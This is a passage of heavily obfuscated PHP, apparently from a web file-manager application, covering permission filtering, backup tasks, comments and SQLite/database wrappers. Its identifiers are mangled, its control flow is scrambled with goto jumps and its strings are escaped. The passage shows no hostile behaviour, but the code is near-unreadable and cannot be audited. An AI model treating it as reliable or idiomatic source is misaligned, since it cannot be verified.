array()) { goto a¡ÈğÉøÔ; c¾º°Ç‚´¢: return parent::insert($fÍ¶Œ¯¶¸); goto fåê¿ƒö¥œ; a¡ÈğÉøÔ: $Cô‰†õˆÂ =& $_SERVER[İåâé¾]; if ($this->findByName($fÍ¶Œ¯¶¸[$Cô‰†õˆÂ[28]])) { return !1; } $A›¤£¡‹¶Í = array($Cô‰†õˆÂ[28] => $Cô‰†õˆÂ[33], $Cô‰†õˆÂ[549] => 1, $Cô‰†õˆÂ[1560] => $Cô‰†õˆÂ[1561], $Cô‰†õˆÂ[1562] => 1, $Cô‰†õˆÂ[822] => 0, $Cô‰†õˆÂ[1563] => 0); goto f¢…‚˜šŒÁ; f¢…‚˜šŒÁ: $fÍ¶Œ¯¶¸ = array_merge($A›¤£¡‹¶Í, $fÍ¶Œ¯¶¸); $fÍ¶Œ¯¶¸[$Cô‰†õˆÂ[1563]] = $this->getSort(); $this->filterAuth($fÍ¶Œ¯¶¸[$Cô‰†õˆÂ[549]]); goto c¾º°Ç‚´¢; fåê¿ƒö¥œ: } private function getSort() { $aÚ¨Ì“éï¸ =& $_SERVER[İåâé¾]; $AŒšÑ­ƒŠ = parent::listData(); $còôĞ±ô¢Õ = array_to_keyvalue($AŒšÑ­ƒŠ, $aÚ¨Ì“éï¸[33], $aÚ¨Ì“éï¸[1563]); return empty($còôĞ±ô¢Õ) ? 0 : max($còôĞ±ô¢Õ) + 1; } private function filterAuth(&$D­ĞÃÌ‡¤‘) { goto b—ğÁËÂ‰İ; B©–ö°ä÷ª: foreach ($E‰âœÃ’¬Ä as $díÓˆµ‚ˆ½) { if ($D­ĞÃÌ‡¤‘ & $díÓˆµ‚ˆ½) { $aÇÍğ‘Ê“[] = $díÓˆµ‚ˆ½; } } if (in_array(self::AUTH_ROOT, $aÇÍğ‘Ê“)) { $D­ĞÃÌ‡¤‘ = array_sum($E‰âœÃ’¬Ä); return; } $aÇÚîÂñƒ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto dÃ¼·ÇáïÑ; dÃ¼·ÇáïÑ: foreach ($aÇÍğ‘Ê“ as $díÓˆµ‚ˆ½) { if (isset($aÇÚîÂñƒ[$díÓˆµ‚ˆ½])) { $aÇÍğ‘Ê“ = array_merge($aÇÍğ‘Ê“, $aÇÚîÂñƒ[$díÓˆµ‚ˆ½]); } } $aÇÍğ‘Ê“[] = self::AUTH_SHOW; $D­ĞÃÌ‡¤‘ = array_sum(array_unique($aÇÍğ‘Ê“)); goto DßÈ‘ƒÜä­; b—ğÁËÂ‰İ: if (!$D­ĞÃÌ‡¤‘) { return; } $E‰âœÃ’¬Ä = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $aÇÍğ‘Ê“ = array(); goto B©–ö°ä÷ª; DßÈ‘ƒÜä­: } public function sort($cˆ¯†ç«‰, $dÊ·¾ğ¬Ë ) { return parent::update($cˆ¯†ç«‰, $dÊ·¾ğ¬Ë ); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\155\x2e\x62\x61\143\153\165\x70\114\151\x73\164"; public $field = array("\x69\157", "\156\141\155\145", "\163\x74\x61\164\x75\163", "\x63\157\x6e\x74\x65\x6e\x74", "\162\145\163\x75\x6c\x74", "\164\151\155\x65\x46\162\157\155", "\164\151\155\145\x54\157"); public function config() { goto f²¶¸´¤‹Ö; f²¶¸´¤‹Ö: $B«ÆŞñ¬á =& $_SERVER[İåâé¾]; $FŸ¡Ü”Ñ¼à = Model($B«ÆŞñ¬á[830])->get($B«ÆŞñ¬á[468]); $FŸ¡Ü”Ñ¼à = json_decode($FŸ¡Ü”Ñ¼à, !0); goto F¦Ñ–¦”È; EÙÊïéÂÜ‘: Action($B«ÆŞñ¬á[1564])->taskInit(); $F†÷©•Èˆè = Model($B«ÆŞñ¬á[1565])->listData(); foreach ($F†÷©•Èˆè as $F†·§–¹´ƒ) { if ($F†·§–¹´ƒ[$B«ÆŞñ¬á[822]] == $B«ÆŞñ¬á[376] && $F†·§–¹´ƒ[$B«ÆŞñ¬á[1074]] == $B«ÆŞñ¬á[1566]) { $dÓ’¥¶°–™ = $F†·§–¹´ƒ; break; } } goto bÃÙ¨ˆëó; bÃÙ¨ˆëó: if (isset($dÓ’¥¶°–™[$B«ÆŞñ¬á[189]])) { $dÓ’¥¶°–™[$B«ÆŞñ¬á[189]] = json_decode($dÓ’¥¶°–™[$B«ÆŞñ¬á[189]], !0); } if (isset($FŸ¡Ü”Ñ¼à[$B«ÆŞñ¬á[189]])) { $dÓ’¥¶°–™[$B«ÆŞñ¬á[189]][$B«ÆŞñ¬á[1061]] = $FŸ¡Ü”Ñ¼à[$B«ÆŞñ¬á[189]]; unset($FŸ¡Ü”Ñ¼à[$B«ÆŞñ¬á[189]]); } return array_merge($dÓ’¥¶°–™, $FŸ¡Ü”Ñ¼à); goto B¤ßÌä‡‚”; F¦Ñ–¦”È: $FŸ¡Ü”Ñ¼à = is_array($FŸ¡Ü”Ñ¼à) ? $FŸ¡Ü”Ñ¼à : array(); if (!isset($FŸ¡Ü”Ñ¼à[$B«ÆŞñ¬á[449]])) { $FŸ¡Ü”Ñ¼à[$B«ÆŞñ¬á[449]] = $B«ÆŞñ¬á[402]; } $dÓ’¥¶°–™ = array(); goto EÙÊïéÂÜ‘; B¤ßÌä‡‚”: } public function listData($EÍ¸™¹ç‹½ = false, $DÕµÖ™Ú¿ = "\x6d\157\144\151\x66\171\x54\x69\155\x65", $Aã¦Â¢Ñª† = false) { return parent::listData($EÍ¸™¹ç‹½, $DÕµÖ™Ú¿, !0); } public function lastItem() { $aƒ¿Ú×Æ– = $this->listData(); return !empty($aƒ¿Ú×Æ–[0]) ? $aƒ¿Ú×Æ–[0] : null; } public function kill($aàÊ¬ˆ­) { goto AÀ‘Í²íøĞ; AÀ‘Í²íøĞ: $aöª‘µÄ·‹ =& $_SERVER[İåâé¾]; $B¯¨ï–õÇ´ = $this->listData($aàÊ¬ˆ­); if (!$B¯¨ï–õÇ´ || empty($B¯¨ï–õÇ´[$aöª‘µÄ·‹[28]])) { return !0; } goto FÀëá—¨óñ; DÍ¢´Œ¸ëÓ: $eóÎ†Ú‚ ² = $B¯¨ï–õÇ´[$aöª‘µÄ·‹[28]]; $cˆÚ‰Æô²Ò = TEMP_FILES . $aöª‘µÄ·‹[475] . $eóÎ†Ú‚ ² . $aöª‘µÄ·‹[8]; IO::remove($cˆÚ‰Æô²Ò, !1); goto BìÅø²íÎ; FÀëá—¨óñ: Task::kill($aöª‘µÄ·‹[467]); Task::kill($aöª‘µÄ·‹[497]); Task::kill($aöª‘µÄ·‹[505]); goto DÍ¢´Œ¸ëÓ; BìÅø²íÎ: return $this->remove($aàÊ¬ˆ­); goto BàÔù¬†´½; BàÔù¬†´½: } public function remove($Aòš¾í‘Ô) { $CÊøÓ«Å‡ = $this->listData($Aòš¾í‘Ô); if (!$CÊøÓ«Å‡) { return !0; } return $this->backupRemove($CÊøÓ«Å‡); } private function backupRemove($F’¨Ê‘²Ä­) { $Fõ“­¾ã»ç =& $_SERVER[İåâé¾]; parent::remove($F’¨Ê‘²Ä­[$Fõ“­¾ã»ç[368]]); $FÒ§ËìÕ»À = "\173\151\157\x3a{$F’¨Ê‘²Ä­[$Fõ“­¾ã»ç[448]]}\175\x2f\144\141\164\141\142\x61\163\x65\57" . $F’¨Ê‘²Ä­[$Fõ“­¾ã»ç[28]]; IO::remove($FÒ§ËìÕ»À, !1); return !0; } public function start() { goto a«Ãßô„Ë; F»É—¤öíÑ: if (Hook::trigger($E„À³©–Í[1567]) == $E„À³©–Í[1568]) { return !0; } $e­ï–İš½ã = $this->process(); foreach ($e­ï–İš½ã as $FÉò„¹‰Ÿµ) { if ($FÉò„¹‰Ÿµ) { return Task::restart($FÉò„¹‰Ÿµ[$E„À³©–Í[368]]); } } goto dàäÈŸÑƒ; dàäÈŸÑƒ: $eÄÓ„í´º„ = new Backup(); $eÄÓ„í´º„->keep(); if (!$eÄÓ„í´º„->db()) { return !1; } goto F‚ÇçÎê‚ğ; a«Ãßô„Ë: $E„À³©–Í =& $_SERVER[İåâé¾]; $FØŞÃ¨ñÊ· = $this->config(); if (!$FØŞÃ¨ñÊ· || $FØŞÃ¨ñÊ·[$E„À³©–Í[1059]] != $E„À³©–Í[376]) { return !1; } goto F»É—¤öíÑ; D”åë¼Š’: return !0; goto A¸²„‡…ãÃ; F‚ÇçÎê‚ğ: if (!$eÄÓ„í´º„->dbFile()) { return !1; } if ($FØŞÃ¨ñÊ·[$E„À³©–Í[449]] == $E„À³©–Í[402]) { $eÄÓ„í´º„->file(); } Backup::set(array($E„À³©–Í[446] => 1, $E„À³©–Í[460] => time())); goto D”åë¼Š’; A¸²„‡…ãÃ: } public function process() { $fãƒ‹Ë‡† =& $_SERVER[İåâé¾]; return array($fãƒ‹Ë‡†[451] => Task::get($fãƒ‹Ë‡†[467]), $fãƒ‹Ë‡†[454] => Task::get($fãƒ‹Ë‡†[497]), $fãƒ‹Ë‡†[163] => Task::get($fãƒ‹Ë‡†[505])); } public function restore() { $cË¸¨’ì«Í =& $_SERVER[İåâé¾]; ActionCall($cË¸¨’ì«Í[1569], !0, 1); ActionCall($cË¸¨’ì«Í[1569], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\157\x6d\x6d\x65\156\164"; protected $tableMeta = array("\164\141\x62\154\145\x4e\x61\155\145" => "\x63\x6f\155\155\x65\x6e\164\137\x6d\x65\x74\141", "\155\x65\x74\x61\x46\x69\145\154\144" => "\x63\157\x6d\x6d\x65\x6e\164\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($fÇ¦™ò¢ô§) { $eßÓæ²Œ =& $_SERVER[İåâé¾]; if ($fÇ¦™ò¢ô§[$eßÓæ²Œ[1570]]) { $BŞ—Ö§ì§Ø = $this->where(array($eßÓæ²Œ[1571] => $fÇ¦™ò¢ô§[$eßÓæ²Œ[1570]]))->find(); if (!$BŞ—Ö§ì§Ø || $BŞ—Ö§ì§Ø[$eßÓæ²Œ[393]] != $fÇ¦™ò¢ô§[$eßÓæ²Œ[393]] || $BŞ—Ö§ì§Ø[$eßÓæ²Œ[395]] != $fÇ¦™ò¢ô§[$eßÓæ²Œ[395]]) { return !1; } $this->where(array($eßÓæ²Œ[1571] => $fÇ¦™ò¢ô§[$eßÓæ²Œ[1570]]))->setAdd($eßÓæ²Œ[1572], 1); } return $this->add($fÇ¦™ò¢ô§); } public function remove($bÀßÈ…¬Í) { $a—ˆã¬î =& $_SERVER[İåâé¾]; $Eò‡¤ñÖ¤¯ = array($a—ˆã¬î[1571] => $bÀßÈ…¬Í); $B¤‘îÓ‘ë = $this->where($Eò‡¤ñÖ¤¯)->find(); if ($B¤‘îÓ‘ë[$a—ˆã¬î[1570]]) { $this->where(array($a—ˆã¬î[1571] => $B¤‘îÓ‘ë[$a—ˆã¬î[1570]]))->setAdd($a—ˆã¬î[1572], -1); } return $this->where($Eò‡¤ñÖ¤¯)->delete(); } public function edit($eØ™‘Í¹ğï, $BØ’”ßÂ—ª) { $DÙ‰ÑíÉ =& $_SERVER[İåâé¾]; $B ‡ÌåÖˆ = array($DÙ‰ÑíÉ[1571] => $eØ™‘Í¹ğï); return $this->where($B ‡ÌåÖˆ)->save(array($DÙ‰ÑíÉ[1573] => $BØ’”ßÂ—ª)); } public function prasise($cŞğô¢Ö¿) { $b²ã¶…œç¤ =& $_SERVER[İåâé¾]; $DˆÌŒÜ˜…ç = Model($b²ã¶…œç¤[1574]); $DŞÔÕšã„ò = array($b²ã¶…œç¤[1571] => $cŞğô¢Ö¿, $b²ã¶…œç¤[1077] => USER_ID); $c¾ôÓÃôÅ¾ = $DˆÌŒÜ˜…ç->where($DŞÔÕšã„ò)->find(); if (!$c¾ôÓÃôÅ¾) { $DˆÌŒÜ˜…ç->add($DŞÔÕšã„ò); $f»ˆ×ïªĞã = $this->where(array($b²ã¶…œç¤[1571] => $cŞğô¢Ö¿))->setAdd($b²ã¶…œç¤[1575], 1); } else { $DˆÌŒÜ˜…ç->where($DŞÔÕšã„ò)->delete(); $f»ˆ×ïªĞã = $this->where(array($b²ã¶…œç¤[1571] => $cŞğô¢Ö¿))->setAdd($b²ã¶…œç¤[1575], -1); } return $f»ˆ×ïªĞã; } public function targetInfo($F¸­Å˜´Šà, $BÅƒÔÔ©Š“) { goto E˜™÷ø·¥¸; aŒá¾ÉÙ: $fóÇ†÷å½‹ = "\122\111\x47\110\x54\x20\x4a\x4f\x49\x4e\40{$this->tablePrefix}\x63\157\155\x6d\145\156\164\137\x70\162\141\151\x73\x65\x20\x73\x74\141\x72\40\x6f\x6e\40\x63\157\155\x6d\x65\156\164\x2e\143\x6f\x6d\x6d\x65\x6e\164\111\x44\40\75\x20\163\164\x61\162\x2e\x63\157\155\155\x65\x6e\x74\111\104"; $föÌÊëİÉ = $this->alias($B¨Ó¯ƒç[343])->where($dÁ ¥¶¸œƒ)->join($fóÇ†÷å½‹, $B¨Ó¯ƒç[1576])->count(); $aøöÂÁáÉ = array($B¨Ó¯ƒç[1577] => $E˜â¾¼§ëõ, $B¨Ó¯ƒç[1578] => $föÌÊëİÉ); goto dÏÇ†õ°¶; E˜™÷ø·¥¸: $B¨Ó¯ƒç =& $_SERVER[İåâé¾]; $dÁ ¥¶¸œƒ = array($B¨Ó¯ƒç[392] => $F¸­Å˜´Šà, $B¨Ó¯ƒç[394] => $BÅƒÔÔ©Š“); $E˜â¾¼§ëõ = $this->where($dÁ ¥¶¸œƒ)->count(); goto aŒá¾ÉÙ; dÏÇ†õ°¶: return $aøöÂÁáÉ; goto F§ìâÃÄæá; F§ìâÃÄæá: } public function listData($D‘§¤°ÙÀĞ) { $A™Öí—øó =& $_SERVER[İåâé¾]; if (isset($D‘§¤°ÙÀĞ[$A™Öí—øó[1579]])) { if ($D‘§¤°ÙÀĞ[$A™Öí—øó[1579]]) { $D‘§¤°ÙÀĞ[$A™Öí—øó[1580]] = array($A™Öí—øó[694], intval($D‘§¤°ÙÀĞ[$A™Öí—øó[1579]])); } unset($D‘§¤°ÙÀĞ[$A™Öí—øó[1579]]); } if (isset($D‘§¤°ÙÀĞ[$A™Öí—øó[1581]])) { if ($D‘§¤°ÙÀĞ[$A™Öí—øó[1581]]) { $D‘§¤°ÙÀĞ[$A™Öí—øó[1580]] = array($A™Öí—øó[691], intval($D‘§¤°ÙÀĞ[$A™Öí—øó[1581]])); } unset($D‘§¤°ÙÀĞ[$A™Öí—øó[1581]]); } return $this->_listData($D‘§¤°ÙÀĞ); } private function _listData($E±Çª¦åÀÜ) { $díÔ÷œíùÏ =& $_SERVER[İåâé¾]; $AÁ³Ò´…º = $this->where($E±Çª¦åÀÜ)->_makeOrder()->selectPage(100); $this->_listAppendParent($AÁ³Ò´…º[$díÔ÷œíùÏ[356]]); $this->_listAppendUser($AÁ³Ò´…º[$díÔ÷œíùÏ[356]]); $this->_listAppendMeta($AÁ³Ò´…º[$díÔ÷œíùÏ[356]]); return $AÁ³Ò´…º; } private function _makeOrder() { $bóÎŒÛº¬ =& $_SERVER[İåâé¾]; $c–î¿°çà™ = array($bóÎŒÛº¬[1575], $bóÎŒÛº¬[1572], $bóÎŒÛº¬[186]); $E¦Ïä›İäó = Input::get($bóÎŒÛº¬[1582], $bóÎŒÛº¬[7], $bóÎŒÛº¬[1583], $c–î¿°çà™); $DÅŠ“ë = Input::get($bóÎŒÛº¬[1584], $bóÎŒÛº¬[7], $bóÎŒÛº¬[1079], array($bóÎŒÛº¬[1585], $bóÎŒÛº¬[1586])); $Dëò‚àì¹± = $E¦Ïä›İäó . $bóÎŒÛº¬[50] . $DÅŠ“ë; return $this->order($Dëò‚àì¹±); } private function _listAppendParent(&$A±°†ó¤Î) { goto Eëª³Ï˜Ë¿; D¼Á’öÌ«»: if (!$BÛ±ƒŸ®) { return; } $eŞò§öë¹ = $this->where(array($cæà—Æ×È[1571] => array($cæà—Æ×È[7], $BÛ±ƒŸ®)))->select(); $eŞò§öë¹ = array_to_keyvalue($eŞò§öë¹, $cæà—Æ×È[1580]); goto BÜİ¡Œ…š‡; BÜİ¡Œ…š‡: foreach ($A±°†ó¤Î as &$a†ƒ™ÃÂğ) { if (isset($eŞò§öë¹[$a†ƒ™ÃÂğ[$cæà—Æ×È[1570]]])) { $a†ƒ™ÃÂğ[$cæà—Æ×È[1587]] = $eŞò§öë¹[$a†ƒ™ÃÂğ[$cæà—Æ×È[1570]]]; } } goto Dì§ª…Ó×¹; Eëª³Ï˜Ë¿: $cæà—Æ×È =& $_SERVER[İåâé¾]; $BÛ±ƒŸ® = array_unique(array_to_keyvalue($A±°†ó¤Î, $cæà—Æ×È[33], $cæà—Æ×È[1570])); $BÛ±ƒŸ® = array_remove_value($BÛ±ƒŸ®, $cæà—Æ×È[402]); goto D¼Á’öÌ«»; Dì§ª…Ó×¹: } private function _listAppendUser(&$dÎõéÈ’è) { goto d„©‰†Í; d„©‰†Í: $b‘ôœªèŒ© =& $_SERVER[İåâé¾]; $aƒŠäÂÈğ = array_unique(array_to_keyvalue($dÎõéÈ’è, $b‘ôœªèŒ©[33], $b‘ôœªèŒ©[1086])); $aƒŠäÂÈğ = array_remove_value($aƒŠäÂÈğ, $b‘ôœªèŒ©[402]); goto FÈ´‚­…²‰; FÈ´‚­…²‰: if (count($aƒŠäÂÈğ) == 0) { return; } foreach ($dÎõéÈ’è as $F§Â°æ·ù”) { if (isset($F§Â°æ·ù”[$b‘ôœªèŒ©[1587]])) { $aƒŠäÂÈğ[] = $F§Â°æ·ù”[$b‘ôœªèŒ©[1587]][$b‘ôœªèŒ©[1086]]; } } $F˜‹†·ê”‘ = Model($b‘ôœªèŒ©[1477])->userListInfo($aƒŠäÂÈğ); goto AÆĞÂ ¤…; AÆĞÂ ¤…: foreach ($dÎõéÈ’è as &$F§Â°æ·ù”) { $F§Â°æ·ù”[$b‘ôœªèŒ©[416]] = $F˜‹†·ê”‘[$F§Â°æ·ù”[$b‘ôœªèŒ©[1086]]]; if (isset($F§Â°æ·ù”[$b‘ôœªèŒ©[1587]])) { $F§Â°æ·ù”[$b‘ôœªèŒ©[1587]][$b‘ôœªèŒ©[416]] = $F˜‹†·ê”‘[$F§Â°æ·ù”[$b‘ôœªèŒ©[1587]][$b‘ôœªèŒ©[1086]]]; } } goto dÌì÷°Ş¬É; dÌì÷°Ş¬É: } private function _listAppendMeta(&$Dô°Õ†‹Ç) { goto A¶öøé¾‰Ç; AË›‰å©ğê: if (!$BÉ…¦¾°¾) { return; } foreach ($Dô°Õ†‹Ç as $bÊ¨‚„º“¡) { if (isset($bÊ¨‚„º“¡[$f¡†¼åñæ[1587]])) { $BÉ…¦¾°¾[] = $bÊ¨‚„º“¡[$f¡†¼åñæ[1587]][$f¡†¼åñæ[1580]]; } } $C™éš‘µ¼ù = $this->metaList($BÉ…¦¾°¾); goto EÔçÖêòæÚ; EÔçÖêòæÚ: if (!$C™éš‘µ¼ù) { return !1; } foreach ($Dô°Õ†‹Ç as &$bÊ¨‚„º“¡) { $bÊ¨‚„º“¡[$f¡†¼åñæ[1588]] = $C™éš‘µ¼ù[$bÊ¨‚„º“¡[$f¡†¼åñæ[1580]]]; if (isset($bÊ¨‚„º“¡[$f¡†¼åñæ[1587]])) { $bÊ¨‚„º“¡[$f¡†¼åñæ[1587]][$f¡†¼åñæ[1588]] = $C™éš‘µ¼ù[$bÊ¨‚„º“¡[$f¡†¼åñæ[1587]][$f¡†¼åñæ[1580]]]; } } goto eœñ²“¢˜Ó; A¶öøé¾‰Ç: $f¡†¼åñæ =& $_SERVER[İåâé¾]; $BÉ…¦¾°¾ = array_unique(array_to_keyvalue($Dô°Õ†‹Ç, $f¡†¼åñæ[33], $f¡†¼åñæ[1580])); $BÉ…¦¾°¾ = array_remove_value($BÉ…¦¾°¾, $f¡†¼åñæ[402]); goto AË›‰å©ğê; eœñ²“¢˜Ó: } private function metaList($D­–ˆ°†Û›) { goto A–÷óÀŠªµ; A–÷óÀŠªµ: $F„ªŞÆ¾ =& $_SERVER[İåâé¾]; if (!$D­–ˆ°†Û›) { return array(); } $bÊ‹ÙÉ¤Û = array($F„ªŞÆ¾[1580] => array($F„ªŞÆ¾[7], $D­–ˆ°†Û›)); goto bŸ–‡ÕÁãè; bŸ–‡ÕÁãè: $Fˆà®—İ†ğ = Model($F„ªŞÆ¾[1589])->where($bÊ‹ÙÉ¤Û)->select(); $Fˆà®—İ†ğ = array_to_keyvalue_group($Fˆà®—İ†ğ, $F„ªŞÆ¾[1580]); foreach ($Fˆà®—İ†ğ as $bâ’¸¼Äì½ => $b‘ÁÕ‡£Ì) { $c‰¥¦§Ñß¨ = array(); foreach ($b‘ÁÕ‡£Ì as $b¨á¡›Úôí) { $c‰¥¦§Ñß¨[$b¨á¡›Úôí[$F„ªŞÆ¾[88]]] = $b¨á¡›Úôí[$F„ªŞÆ¾[359]]; } $Fˆà®—İ†ğ[$bâ’¸¼Äì½] = $c‰¥¦§Ñß¨; } goto EÆÂéˆµœî; EÆÂéˆµœî: return $Fˆà®—İ†ğ ? $Fˆà®—İ†ğ : array(); goto EˆñŒŠÃ; EˆñŒŠÃ: } } goto CğÓéŒßÉ; C’»›Ú˜Š±: class DbSqlite extends DbSqliteBase { public function query($fë»·¶§å) { goto eãÃ­•‹œ˜; eãÃ­•‹œ˜: $DâçÌ»Éæõ =& $_SERVER[İåâé¾]; $fõ…ñ»¸¦İ = DATA_PATH . $DâçÌ»Éæõ[638]; $Eî‘ğšÙÀ = fopen($fõ…ñ»¸¦İ, $DâçÌ»Éæõ[639]); goto cˆæ¤©·‘¾; cˆæ¤©·‘¾: if (flock($Eî‘ğšÙÀ, LOCK_EX)) { $FõÜ§ñÊ¬Ô = parent::query($fë»·¶§å); flock($Eî‘ğšÙÀ, LOCK_UN); fclose($Eî‘ğšÙÀ); return $FõÜ§ñÊ¬Ô; } flock($Eî‘ğšÙÀ, LOCK_UN); fclose($Eî‘ğšÙÀ); goto dåïÙ®Ò”«; dåïÙ®Ò”«: show_json($DâçÌ»Éæõ[640], !1); return !1; goto bÈÏäº¾µ; bÈÏäº¾µ: } public function execute($fˆëÌá·õî) { goto AåÜ­¤íò; aÏÌô›©«¼: show_json($b™åòäß‚[640], !1); return !1; goto eß÷ó²ÉÙ; FÒíŞ’™Â˜: if (flock($bÎå˜ÎÇš†, LOCK_EX)) { $F¿ÎïŸî‰ = parent::execute($fˆëÌá·õî); flock($bÎå˜ÎÇš†, LOCK_UN); fclose($bÎå˜ÎÇš†); return $F¿ÎïŸî‰; } flock($bÎå˜ÎÇš†, LOCK_UN); fclose($bÎå˜ÎÇš†); goto aÏÌô›©«¼; AåÜ­¤íò: $b™åòäß‚ =& $_SERVER[İåâé¾]; $bî”Ì¹ôÅ = DATA_PATH . $b™åòäß‚[638]; $bÎå˜ÎÇš† = fopen($bî”Ì¹ôÅ, $b™åòäß‚[639]); goto FÒíŞ’™Â˜; eß÷ó²ÉÙ: } } class DbSqlite3 extends DbSqlite3Base { public function query($e¸½ñ¾¥…‘) { goto BÚ×¢šØ½Á; E„¦‘÷çµƒ: show_json($E”„¹ô˜—¾[640], !1); return !1; goto F†¦ò¿Í”¡; BÚ×¢šØ½Á: $E”„¹ô˜—¾ =& $_SERVER[İåâé¾]; $D‡í†ò¦½› = DATA_PATH . $E”„¹ô˜—¾[638]; $D Œ¥Ÿâ• = fopen($D‡í†ò¦½›, $E”„¹ô˜—¾[639]); goto bèæÎÀŠÃ; bèæÎÀŠÃ: if (flock($D Œ¥Ÿâ•, LOCK_EX)) { $eİº ô‰«µ = parent::query($e¸½ñ¾¥…‘); flock($D Œ¥Ÿâ•, LOCK_UN); fclose($D Œ¥Ÿâ•); return $eİº ô‰«µ; } flock($D Œ¥Ÿâ•, LOCK_UN); fclose($D Œ¥Ÿâ•); goto E„¦‘÷çµƒ; F†¦ò¿Í”¡: } public function execute($a‹Â‰É¡) { goto DÈîøéåÚÂ; aÕ°ŒêÁ: show_json($dÀ²¦ï¨“–[640], !1); return !1; goto FÏŸøé¸ÚÆ; E‰Ë‰ŒŠ·Í: if (flock($A’Ä´åµè†, LOCK_EX)) { $eĞŠÑ·Ã¦Ê = parent::execute($a‹Â‰É¡); flock($A’Ä´åµè†, LOCK_UN); fclose($A’Ä´åµè†); return $eĞŠÑ·Ã¦Ê; } flock($A’Ä´åµè†, LOCK_UN); fclose($A’Ä´åµè†); goto aÕ°ŒêÁ; DÈîøéåÚÂ: $dÀ²¦ï¨“– =& $_SERVER[İåâé¾]; $D™ÔÁìÊÚâ = DATA_PATH . $dÀ²¦ï¨“–[638]; $A’Ä´åµè† = fopen($D™ÔÁìÊÚâ, $dÀ²¦ï¨“–[639]); goto E‰Ë‰ŒŠ·Í; FÏŸøé¸ÚÆ: } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\150\151\156\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\145\x71" => "\x3d", "\156\x65\161" => "\74\76", "\x67\164" => "\x3e", "\145\x67\164" => "\x3e\x3d", "\x6c\x74" => "\74", "\x65\154\164" => "\74\x3d", "\156\157\x74\x6c\151\x6b\145" => "\116\x4f\x54\40\x4c\111\113\x45", "\x6c\151\x6b\145" => "\x4c\x49\113\105", "\x69\156" => "\x49\x4e", "\x6e\157\x74\x69\156" => "\116\117\124\x20\x49\x4e", "\x6e\157\x74\x20\151\156" => "\x4e\x4f\124\40\111\116", "\x62\145\164\167\x65\145\156" => "\102\x45\x54\x57\x45\105\x4e", "\x6e\157\x74\x62\x65\164\x77\x65\x65\x6e" => "\116\x4f\x54\x20\x42\105\x54\127\x45\105\116", "\x6e\x6f\164\40\142\x65\164\x77\145\145\x6e" => "\x4e\x4f\124\x20\102\x45\x54\x57\x45\105\116"); protected $selectSql = "\123\105\114\x45\103\124\45\104\x49\x53\124\111\x4e\x43\x54\45\x20\x25\106\x49\x45\114\x44\x25\x20\x46\x52\117\x4d\x20\45\124\x41\x42\114\x45\45\45\x4a\x4f\111\116\x25\x25\127\110\x45\122\105\x25\x25\107\122\x4f\x55\120\45\45\110\101\x56\111\x4e\x47\x25\45\117\x52\104\105\x52\45\x25\x4c\x49\x4d\111\x54\45\x20\x25\x55\x4e\111\117\116\x25\45\103\x4f\x4d\115\105\x4e\124\x25"; protected $bind = array(); public static function getInstance() { $bÅµîâæ¨³ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[İåâé¾][641], $bÅµîâæ¨³); } public function factory($BÙ‡ëôóÑ = '') { goto bÓëËìá¼–; cíçŞ”Âò™: $this->dbType = ucwords(strtolower($BÙ‡ëôóÑ[$C¹®ïÄÕË²[642]])); $câÙê›äºÜ = $C¹®ïÄÕË²[644] . $this->dbType; if (class_exists($câÙê›äºÜ)) { $B‹Ğ«àæ×ª = new $câÙê›äºÜ($BÙ‡ëôóÑ); if ($C¹®ïÄÕË²[491] != strtolower($BÙ‡ëôóÑ[$C¹®ïÄÕË²[642]])) { $B‹Ğ«àæ×ª->dbType = strtoupper($this->dbType); } else { $B‹Ğ«àæ×ª->dbType = $this->_getDsnType($BÙ‡ëôóÑ[$C¹®ïÄÕË²[594]]); } } else { think_exception(think_lang($C¹®ïÄÕË²[645]) . $C¹®ïÄÕË²[646] . $câÙê›äºÜ); } goto FùÌŞ“†; FùÌŞ“†: return $B‹Ğ«àæ×ª; goto D¿Í©ß¬¨±; bÓëËìá¼–: $C¹®ïÄÕË² =& $_SERVER[İåâé¾]; $BÙ‡ëôóÑ = $this->parseConfig($BÙ‡ëôóÑ); if (empty($BÙ‡ëôóÑ[$C¹®ïÄÕË²[642]])) { think_exception(think_lang($C¹®ïÄÕË²[643])); } goto cíçŞ”Âò™; D¿Í©ß¬¨±: } public function __call($C¸¤»ãèõ§, $eË„³ğ„¯) { if (method_exists($this, $C¸¤»ãèõ§)) { return call_user_func_array(array($this, $C¸¤»ãèõ§), $eË„³ğ„¯); } } protected function _getDsnType($Aƒ’õÆÕá) { $c¹È³óù­ó = explode($_SERVER[İåâé¾][4], $Aƒ’õÆÕá); $aÆ­Éé—ƒ = strtoupper(trim($c¹È³óù­ó[0])); return $aÆ­Éé—ƒ; } private function parseConfig($cÑÜ‰™Ş§¶ = '') { $E¹‘ší†Óì =& $_SERVER[İåâé¾]; if (!empty($cÑÜ‰™Ş§¶) && is_string($cÑÜ‰™Ş§¶)) { $cÑÜ‰™Ş§¶ = $this->parseDSN($cÑÜ‰™Ş§¶); } elseif (is_array($cÑÜ‰™Ş§¶)) { $cÑÜ‰™Ş§¶ = array_change_key_case($cÑÜ‰™Ş§¶); $cÑÜ‰™Ş§¶ = array($E¹‘ší†Óì[642] => $cÑÜ‰™Ş§¶[$E¹‘ší†Óì[647]], $E¹‘ší†Óì[566] => 